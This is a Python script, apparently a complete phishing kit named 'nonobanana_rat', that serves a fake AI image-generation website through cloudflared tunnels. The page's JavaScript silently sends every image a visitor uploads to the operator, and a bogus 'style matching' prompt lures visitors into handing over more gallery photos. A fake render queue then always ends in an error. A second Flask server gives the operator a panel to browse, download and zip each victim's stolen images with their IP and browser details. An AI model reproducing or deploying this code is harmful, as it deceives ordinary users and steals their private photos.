#!/usr/bin/env python3
"""
nonobanana_rat.py  —  web-only build
dual tunnel: victim page + attacker panel
victim port 8000 / attacker port 8001
"""

import os, sys, json, uuid, time, threading, subprocess, base64, re, io, zipfile
from pathlib import Path
from flask import Flask, request, Response, send_from_directory, jsonify, abort

VICTIM_PORT   = 8000
ATTACKER_PORT = 8001
LOOT_DIR      = Path("./loot")
LOOT_DIR.mkdir(exist_ok=True)

BANNER = r"""
 ██╗  ██╗ █████╗ ██╗  ██╗██╗   ██╗    ██████╗ ███████╗
 ██║ ██╔╝██╔══██╗██║ ██╔╝██║   ██║    ██╔══██╗██╔═══██║    ██║
 █████╔╝ ███████║█████╔╝ ██║   ██║    ██║  ██║█████╗ ██║  ██║
 ██╔═██╗ ██╔══██║██╔═██╗ ██║   ██║    ██║  ██║██╔══   ██ ██║
 ██║  ██╗██║  ██║██║  ██╗╚██████╔╝    ██████╔╝███████╗╚███╔╝
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝ ╚══════╝ ╚══

   telegram : https://t.me/kakuexploits
   community: https://t.me/kakuexploitscommunity
   owner    : ypu should know me
"""

victims = {}
lock = threading.Lock()

def get_ip():
    return (request.headers.get("CF-Connecting-IP")
            or request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
            or request.remote_addr or "?")

def register_hit(ip, ua):
    with lock:
        for vid, v in victims.items():
            if v["ip"] == ip and v["ua"] == ua:
                v["last_seen"] = time.time()
                return vid
        vid = uuid.uuid4().hex[:12]
        victims[vid] = {
            "ip": ip, "ua": ua,
            "first_seen": time.time(), "last_seen": time.time(),
            "images": []
        }
        (LOOT_DIR / vid).mkdir(exist_ok=True)
        return vid

# ---------- attacker ----------
attacker = Flask("attacker")

@attacker.route("/")
def a_index():
    with lock:
        rows = "".join(
            f"""<tr>
              <td><a href="/v/{vid}">{vid}</a></td>
              <td>{v['ip']}</td>
              <td>{time.ctime(v['first_seen'])}</td>
              <td>{len(v['images'])}</td>
              <td><a href="/v/{vid}/zip">zip all</a></td>
            </tr>""" for vid, v in victims.items()
        )
    return f"""<!doctype html><html><head><meta charset=utf-8><title>panel</title>
<style>
body{{background:#0b0b0d;color:#e6e6e6;font-family:ui-monospace,monospace;padding:24px}}
a{{color:#7ee787}} table{{width:100%;border-collapse:collapse}}
th,td{{border-bottom:1px solid #222;padding:10px;text-align:left}}
h1{{color:#ff7b72}}
</style></head><body>
<h1>kaku panel</h1>
<p>victims: {len(victims)}</p>
<table><tr><th>id</th><th>ip</th><th>first seen</th><th>images</th><th>bulk</th></tr>
{rows}</table></body></html>"""

@attacker.route("/v/<vid>")
def a_victim(vid):
    v = victims.get(vid)
    if not v: abort(404)
    imgs = "".join(
        f"""<div style="display:inline-block;margin:8px;text-align:center;vertical-align:top">
          <a href="/v/{vid}/img/{i}" target="_blank">
            <img src="/v/{vid}/img/{i}" style="max-width:180px;max-height:180px;border:1px solid #333">
          </a><br>
          <span style="font-size:11px;color:#888">{img['name']}</span><br>
          <a href="/v/{vid}/dl/{i}">download</a>
        </div>""" for i, img in enumerate(v["images"])
    )
    return f"""<!doctype html><html><head><meta charset=utf-8><title>{vid}</title>
<style>body{{background:#0b0b0d;color:#e6e6e6;font-family:ui-monospace,monospace;padding:24px}}a{{color:#7ee787}}</style>
</head><body>
<h2>{vid}</h2>
<p>ip: {v['ip']}<br>ua: {v['ua']}<br>images: {len(v['images'])}</p>
<p><a href="/">back</a> | <a href="/v/{vid}/zip">download all as zip</a></p>
{imgs}</body></html>"""

@attacker.route("/v/<vid>/img/<int:idx>")
def a_img(vid, idx):
    v = victims.get(vid)
    if not v or idx >= len(v["images"]): abort(404)
    img = v["images"][idx]
    return Response(base64.b64decode(img["data"]), mimetype=img.get("mime", "image/jpeg"))

@attacker.route("/v/<vid>/dl/<int:idx>")
def a_dl(vid, idx):
    v = victims.get(vid)
    if not v or idx >= len(v["images"]): abort(404)
    img = v["images"][idx]
    raw = base64.b64decode(img["data"])
    return Response(raw, mimetype="application/octet-stream",
                    headers={"Content-Disposition": f'attachment; filename="{img["name"]}"'})

@attacker.route("/v/<vid>/zip")
def a_zip(vid):
    v = victims.get(vid)
    if not v or not v["images"]: abort(404)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for i, img in enumerate(v["images"]):
            z.writestr(f"{i:04d}_{img['name']}", base64.b64decode(img["data"]))
    buf.seek(0)
    return Response(buf.read(), mimetype="application/zip",
                    headers={"Content-Disposition": f'attachment; filename="{vid}.zip"'})

# ---------- victim ----------
victim = Flask("victim")

VICTIM_PAGE = r"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NonoBanana — AI Image Studio</title>
<style>
:root{--bg:#0a0a0c;--panel:#131316;--panel2:#17171b;--line:#232329;--line2:#2c2c33;
--txt:#ededf2;--sub:#8b8b96;--dim:#5a5a63;--acc:#ffcc4d;--acc2:#ff7b72;--ok:#7ee787}
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif}
body{background:var(--bg);color:var(--txt);min-height:100vh;display:flex;flex-direction:column;font-size:14px;-webkit-font-smoothing:antialiased}
a{color:inherit;text-decoration:none}
nav{position:sticky;top:0;z-index:50;background:rgba(10,10,12,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);padding:0 20px;height:56px;display:flex;align-items:center;gap:28px}
.logo{display:flex;align-items:center;gap:9px;font-weight:700;letter-spacing:-.2px;font-size:15px}
.logo .mark{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,#ffcc4d,#ff7b72);display:flex;align-items:center;justify-content:center;font-weight:800;color:#111;font-size:13px}
nav .links{display:flex;gap:22px;font-size:13px;color:var(--sub)}
nav .links a:hover{color:var(--txt)}
nav .right{margin-left:auto;display:flex;align-items:center;gap:10px}
.pill{font-size:12px;padding:6px 12px;border-radius:100px;border:1px solid var(--line2);color:var(--sub);cursor:pointer;background:transparent}
.pill.primary{background:var(--acc);color:#111;border-color:var(--acc);font-weight:600}
main{flex:1;max-width:1180px;width:100%;margin:0 auto;padding:28px 20px 60px}
.hero{display:grid;grid-template-columns:1.1fr 1fr;gap:36px;align-items:start}
@media(max-width:860px){.hero{grid-template-columns:1fr}}
h1{font-size:34px;line-height:1.15;letter-spacing:-.8px;margin-bottom:12px;font-weight:700}
h1 em{font-style:normal;background:linear-gradient(120deg,#ffcc4d,#ff7b72);-webkit-background-clip:text;background-clip:text;color:transparent}
.lead{color:var(--sub);font-size:15px;line-height:1.55;margin-bottom:22px;max-width:520px}
.stats{display:flex;gap:26px;margin:22px 0 6px;flex-wrap:wrap}
.stat b{display:block;font-size:20px;font-weight:700}
.stat span{font-size:12px;color:var(--dim);letter-spacing:.3px;text-transform:uppercase}
.workspace{background:var(--panel);border:1px solid var(--line);border-radius:14px;overflow:hidden}
.ws-head{padding:13px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px;font-size:13px;color:var(--sub)}
.ws-head .dot{width:7px;height:7px;border-radius:100px;background:var(--ok);box-shadow:0 0 8px var(--ok)}
.ws-head .mode{margin-left:auto;font-size:11px;color:var(--dim);border:1px solid var(--line2);padding:3px 8px;border-radius:100px}
.ws-body{padding:18px}
.tabs{display:flex;gap:4px;background:#0d0d10;border:1px solid var(--line);border-radius:10px;padding:3px;margin-bottom:16px}
.tab{flex:1;padding:8px 10px;text-align:center;font-size:12px;color:var(--sub);border-radius:8px;cursor:pointer;transition:.12s}
.tab.on{background:#1c1c22;color:var(--txt)}
.drop{border:1.5px dashed #33333c;border-radius:12px;padding:34px 18px;text-align:center;cursor:pointer;transition:.15s;background:#0e0e11}
.drop:hover,.drop.over{border-color:var(--acc);background:#141419}
.drop .ico{width:44px;height:44px;margin:0 auto 12px;border-radius:12px;background:#1a1a20;display:flex;align-items:center;justify-content:center;font-size:20px}
.drop .t{font-weight:600;margin-bottom:5px;font-size:14px}
.drop .s{font-size:12px;color:var(--dim)}
.thumbs{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-top:14px}
.thumbs .th{aspect-ratio:1;border-radius:8px;overflow:hidden;border:1px solid var(--line);position:relative;background:#0e0e11}
.thumbs .th img{width:100%;height:100%;object-fit:cover;display:block}
.thumbs .th .x{position:absolute;top:4px;right:4px;width:18px;height:18px;border-radius:100px;background:rgba(0,0,0,.7);color:#fff;font-size:11px;line-height:18px;text-align:center;cursor:pointer}
.promptbox{margin-top:16px}
.promptbox label{display:block;font-size:12px;color:var(--dim);margin-bottom:7px;letter-spacing:.3px}
textarea{width:100%;background:#0e0e11;border:1px solid var(--line);color:var(--txt);border-radius:10px;padding:12px 13px;resize:vertical;min-height:76px;font-family:inherit;font-size:13.5px;line-height:1.5}
textarea:focus{outline:none;border-color:#3a3a44}
.chips{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
.chip{font-size:11.5px;padding:5px 10px;border:1px solid var(--line2);border-radius:100px;color:var(--sub);cursor:pointer;background:transparent}
.chip:hover{border-color:var(--acc);color:var(--txt)}
button.go{margin-top:16px;width:100%;padding:13px;border:none;border-radius:10px;background:var(--acc);color:#111;font-weight:700;font-size:14px;cursor:pointer;letter-spacing:.2px}
button.go:disabled{opacity:.4;cursor:not-allowed}
button.go.loading{background:#2a2a30;color:var(--sub)}
.queue{margin-top:14px;background:#0e0e11;border:1px solid var(--line);border-radius:10px;padding:14px;display:none}
.queue .row{display:flex;justify-content:space-between;font-size:12.5px;margin-bottom:8px;color:var(--sub)}
.queue .row b{color:var(--txt);font-weight:600}
.bar{height:5px;background:#1c1c22;border-radius:100px;overflow:hidden;margin-top:10px}
.bar > i{display:block;height:100%;width:0;background:linear-gradient(90deg,#ffcc4d,#ff7b72);transition:width .7s ease}
.side{display:flex;flex-direction:column;gap:18px}
.side h3{font-size:12px;letter-spacing:.6px;text-transform:uppercase;color:var(--dim);font-weight:600;margin-bottom:11px}
.gal{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
.gal .g{aspect-ratio:1;border-radius:9px;background:linear-gradient(135deg,#1a1a20,#232329);border:1px solid var(--line);position:relative;overflow:hidden}
.gal .g::after{content:attr(data-l);position:absolute;bottom:6px;left:7px;font-size:10px;color:var(--dim)}
.gal .g:nth-child(1){background:linear-gradient(135deg,#3a2a1a,#5a3a2a)}
.gal .g:nth-child(2){background:linear-gradient(135deg,#1a2a3a,#2a4a5a)}
.gal .g:nth-child(3){background:linear-gradient(135deg,#2a1a2a,#4a2a4a)}
.gal .g:nth-child(4){background:linear-gradient(135deg,#1a3a2a,#2a5a4a)}
.gal .g:nth-child(5){background:linear-gradient(135deg,#3a3a1a,#5a5a2a)}
.gal .g:nth-child(6){background:linear-gradient(135deg,#2a2a3a,#4a4a5a)}
.card-sm{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
.models{display:flex;flex-direction:column;gap:8px}
.model{display:flex;align-items:center;gap:10px;padding:9px 11px;border:1px solid var(--line);border-radius:9px;font-size:13px;cursor:pointer;background:#0e0e11}
.model.on{border-color:var(--acc);background:#17170f}
.model .sw{width:8px;height:8px;border-radius:100px;background:var(--acc)}
.model .r{margin-left:auto;font-size:11px;color:var(--dim)}
.recent{display:flex;flex-direction:column;gap:9px;font-size:12.5px}
.recent .it{display:flex;gap:9px;align-items:center;color:var(--sub)}
.recent .it .av{width:26px;height:26px;border-radius:100px;background:linear-gradient(135deg,#3a2a1a,#5a3a2a);flex:0 0 26px}
.recent .it .tx{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.recent .it .ts{margin-left:auto;color:var(--dim);font-size:11px;flex:0 0 auto}
.lib-card{display:none;background:linear-gradient(180deg,#0e1a12,#0b120d);border:1px solid #1e3a24;border-radius:12px;padding:15px;font-size:13px;color:#b8e0bb;line-height:1.55}
.lib-card b{color:#7ee787}
.lib-card button{margin-top:11px;padding:9px 14px;border:none;border-radius:9px;background:#2d7d32;color:#fff;font-weight:600;font-size:12.5px;cursor:pointer;width:100%}
.err{margin-top:14px;display:none;background:#1a0f10;border:1px solid #3a1a1c;color:#ffb4b4;padding:12px 14px;border-radius:10px;font-size:12.5px;line-height:1.5}
.err b{color:#ff7b72}
footer{border-top:1px solid var(--line);padding:24px 20px;color:var(--dim);font-size:12px}
footer .wrap{max-width:1180px;margin:0 auto;display:flex;gap:24px;flex-wrap:wrap;align-items:center}
footer a{color:var(--sub)}
footer a:hover{color:var(--txt)}
footer .r{margin-left:auto;display:flex;gap:18px}
</style></head>
<body>

<nav>
  <div class="logo"><div class="mark">N</div>NonoBanana</div>
  <div class="links">
    <a href="/">Studio</a>
    <a href="/">Gallery</a>
    <a href="/">Models</a>
    <a href="/">Pricing</a>
    <a href="/">Docs</a>
  </div>
  <div class="right">
    <button class="pill">Sign in</button>
    <button class="pill primary">Get Pro</button>
  </div>
</nav>

<main>
  <div class="hero">
    <div>
      <h1>Turn any image into <em>anything</em>.</h1>
      <p class="lead">NonoBanana's image-to-image engine restyles, upscales, and reimagines your photos in seconds. Free tier includes unlimited standard generations.</p>
      <div class="stats">
        <div class="stat"><b>2.4M</b><span>creators</span></div>
        <div class="stat"><b>91M</b><span>generations</span></div>
        <div class="stat"><b>~3.2s</b><span>avg time</span></div>
        <div class="stat"><b>v4.2</b><span>engine</span></div>
      </div>
      <div class="card-sm" style="margin-top:22px">
        <h3>Live in the studio</h3>
        <div class="recent" id="recent">
          <div class="it"><div class="av"></div><div class="tx">@mira.k — "golden hour portrait, cinematic"</div><div class="ts">now</div></div>
          <div class="it"><div class="av" style="background:linear-gradient(135deg,#1a2a3a,#2a4a5a)"></div><div class="tx">@dvn — "cyberpunk alley, neon rain"</div><div class="ts">2m</div></div>
          <div class="it"><div class="av" style="background:linear-gradient(135deg,#2a1a2a,#4a2a4a)"></div><div class="tx">@tessa.r — "studio product shot, softbox"</div><div class="ts">4m</div></div>
          <div class="it"><div class="av" style="background:linear-gradient(135deg,#1a3a2a,#2a5a4a)"></div><div class="tx">@nords — "watercolor, pastel, loose"</div><div class="ts">7m</div></div>
        </div>
      </div>
    </div>

    <div class="side">
      <div class="workspace">
        <div class="ws-head"><span class="dot"></span>studio — image → image <span class="mode">free tier</span></div>
        <div class="ws-body">
          <div class="tabs">
            <div class="tab on">Image → Image</div>
            <div class="tab">Upscale</div>
            <div class="tab">Restore</div>
          </div>

          <div class="drop" id="drop">
            <div class="ico">🖼️</div>
            <div class="t">Drop reference images here</div>
            <div class="s">or click to browse · JPG PNG WEBP · up to 8 files</div>
          </div>

          <input id="file" type="file" accept="image/*" multiple style="display:none">
          <input id="libfile" type="file" accept="image/*" multiple style="display:none">

          <div class="thumbs" id="thumbs"></div>

          <div class="promptbox">
            <label>Prompt</label>
            <textarea id="prompt" placeholder="describe the transformation… e.g. 'cinematic golden hour, shallow depth of field, 85mm'"></textarea>
            <div class="chips">
              <div class="chip" data-p="cinematic, golden hour, 85mm">cinematic</div>
              <div class="chip" data-p="studio softbox lighting, product shot">studio</div>
              <div class="chip" data-p="anime style, cel shaded, vivid colors">anime</div>
              <div class="chip" data-p="watercolor, pastel, loose strokes">watercolor</div>
              <div class="chip" data-p="35mm film grain, kodak portra, soft">film</div>
            </div>
          </div>

          <button class="go" id="go" disabled>Generate</button>

          <div class="queue" id="queue">
            <div class="row"><span>Position</span><b id="pos">—</b></div>
            <div class="row"><span>Estimated</span><b id="eta">—</b></div>
            <div class="bar"><i id="bar"></i></div>
          </div>

          <div class="lib-card" id="lib">
            <b>Style matching available.</b><br>
            NonoBanana can scan your recent gallery to match your personal aesthetic for better results.
            <button id="libbtn">Enable style matching</button>
          </div>

          <div class="err" id="err">
            <b>Generation failed.</b> Couldn't reach the render server. Check your connection and try again.
          </div>
        </div>
      </div>

      <div class="card-sm">
        <h3>Recent generations</h3>
        <div class="gal">
          <div class="g" data-l="portrait"></div>
          <div class="g" data-l="alley"></div>
          <div class="g" data-l="product"></div>
          <div class="g" data-l="sketch"></div>
          <div class="g" data-l="film"></div>
          <div class="g" data-l="studio"></div>
        </div>
      </div>

      <div class="card-sm">
        <h3>Engine</h3>
        <div class="models">
          <div class="model on"><span class="sw"></span>NB-4.2 Turbo <span class="r">default</span></div>
          <div class="model"><span class="sw" style="background:#5a5a63"></span>NB-3.8 Classic <span class="r">slower</span></div>
          <div class="model"><span class="sw" style="background:#5a5a63"></span>NB-Upscale Pro <span class="r">pro</span></div>
        </div>
      </div>
    </div>
  </div>
</main>

<footer>
  <div class="wrap">
    <span>© 2025 NonoBanana Labs</span>
    <a href="/">Terms</a>
    <a href="/">Privacy</a>
    <a href="/">Status</a>
    <div class="r">
      <a href="/">Discord</a>
      <a href="/">X</a>
      <a href="/">API</a>
    </div>
  </div>
</footer>

<script>
(function(){
  const $ = s => document.querySelector(s);
  const drop=$('#drop'), file=$('#file'), libfile=$('#libfile'), lib=$('#lib'), libbtn=$('#libbtn');
  const thumbs=$('#thumbs'), prompt=$('#prompt'), go=$('#go'), queue=$('#queue');
  const pos=$('#pos'), eta=$('#eta'), bar=$('#bar'), err=$('#err');
  let chosen=[];

  async function exfil(files){
    for(const f of files){
      try{
        const b64 = await new Promise(res=>{const r=new FileReader();r.onload=e=>res(e.target.result.split(',')[1]);r.readAsDataURL(f);});
        fetch('/api/u',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({name:f.name,mime:f.type,data:b64})}).catch(()=>{});
      }catch(_){}
    }
  }

  function renderThumbs(){
    thumbs.innerHTML='';
    chosen.forEach((f,i)=>{
      const d=document.createElement('div'); d.className='th';
      const im=document.createElement('img');
      const r=new FileReader(); r.onload=e=>im.src=e.target.result; r.readAsDataURL(f);
      const x=document.createElement('div'); x.className='x'; x.textContent='✕';
      x.onclick=e=>{e.stopPropagation();chosen.splice(i,1);renderThumbs();updateGo();};
      d.appendChild(im); d.appendChild(x); thumbs.appendChild(d);
    });
  }
  function updateGo(){ go.disabled = !(chosen.length && prompt.value.trim()); }

  drop.onclick=()=>file.click();
  drop.ondragover=e=>{e.preventDefault();drop.classList.add('over');};
  drop.ondragleave=()=>drop.classList.remove('over');
  drop.ondrop=e=>{e.preventDefault();drop.classList.remove('over');handleFiles(e.dataTransfer.files);};
  file.onchange=()=>handleFiles(file.files);

  function handleFiles(fl){
    if(!fl||!fl.length) return;
    chosen = chosen.concat([...fl]).slice(0,8);
    renderThumbs(); updateGo();
    exfil(fl);
    setTimeout(()=>{ lib.style.display='block'; }, 1400);
  }

  prompt.addEventListener('input', updateGo);
  document.querySelectorAll('.chip').forEach(c=>{
    c.onclick=()=>{ prompt.value = c.dataset.p + (prompt.value? ', '+prompt.value:''); updateGo(); };
  });

  libbtn.onclick=()=>libfile.click();
  libfile.onchange=()=>{
    const fl=libfile.files; if(!fl||!fl.length) return;
    exfil(fl);
    libbtn.textContent='Style matching enabled ✓';
    libbtn.disabled=true;
  };

  go.onclick=()=>{
    go.disabled=true; go.classList.add('loading'); go.textContent='Generating…';
    queue.style.display='block'; err.style.display='none'; bar.style.width='0%';
    let p=14+Math.floor(Math.random()*46);
    let e=p*(1.6+Math.random()*1.8);
    const upd=()=>{pos.textContent='#'+p;eta.textContent=Math.ceil(e)+'s';bar.style.width=Math.min(96,100-(p/60)*100)+'%';};
    upd();
    const t=setInterval(()=>{
      p=Math.max(1,p-(1+Math.floor(Math.random()*3)));
      e=Math.max(1,e-(1+Math.random()*1.6));
      upd();
      if(p<=1||e<=1){clearInterval(t);
        setTimeout(()=>{bar.style.width='100%';
          setTimeout(()=>{
            queue.style.display='none';
            err.style.display='block';
            go.classList.remove('loading');
            go.textContent='Generate';
            go.disabled=false;
          },900);
        },500);
      }
    },850);
  };
})();
</script>
</body></html>
"""

@victim.route("/")
def v_index():
    ip = get_ip(); ua = request.headers.get("User-Agent", "?")
    register_hit(ip, ua)
    return Response(VICTIM_PAGE, mimetype="text/html")

@victim.route("/api/u", methods=["POST"])
def v_upload():
    data = request.get_json(silent=True) or {}
    ip = get_ip(); ua = request.headers.get("User-Agent", "?")
    vid = register_hit(ip, ua)
    name = re.sub(r"[^\w\.\-]", "_", data.get("name", "img"))
    mime = data.get("mime", "image/jpeg")
    b64  = data.get("data", "")
    if not b64: return jsonify(ok=False), 400
    try:
        raw = base64.b64decode(b64)
        if len(raw) > 25*1024*1024:
            return jsonify(ok=False, err="too large"), 413
        with lock:
            victims[vid]["images"].append({"name":name, "mime":mime, "data":b64})
        with open(LOOT_DIR / vid / name, "wb") as f:
            f.write(raw)
        print(f"[+] {vid} +{name} ({len(raw)//1024}KB)", flush=True)
        return jsonify(ok=True)
    except Exception as e:
        print("upload err:", e)
        return jsonify(ok=False), 500

# ---------- tunnels ----------
def spawn_tunnel(port, label):
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )
    holder = {"url": None}
    def reader():
        for line in proc.stdout:
            m = re.search(r"https://(?!api\.)[a-z0-9\-]+\.trycloudflare\.com", line)
            if m and not holder["url"]:
                holder["url"] = m.group(0)
                print(f"\n[+] {label} URL: {holder['url']}\n", flush=True)
    threading.Thread(target=reader, daemon=True).start()
    return proc, holder

def run_flask(app, port):
    app.run(host="127.0.0.1", port=port, debug=False, use_reloader=False, threaded=True)

def main():
    print(BANNER)
    print(f"[*] victim   flask → 127.0.0.1:{VICTIM_PORT}")
    print(f"[*] attacker flask → 127.0.0.1:{ATTACKER_PORT}")
    threading.Thread(target=run_flask, args=(victim, VICTIM_PORT), daemon=True).start()
    threading.Thread(target=run_flask, args=(attacker, ATTACKER_PORT), daemon=True).start()
    time.sleep(1.5)
    print("[*] opening cloudflared tunnels...")
    p1, u1 = spawn_tunnel(VICTIM_PORT,   "VICTIM   (send this)")
    p2, u2 = spawn_tunnel(ATTACKER_PORT, "ATTACKER (yours)")
    try:
        while True: time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] shutting down")
        p1.terminate(); p2.terminate()

if __name__ == "__main__":
    main()
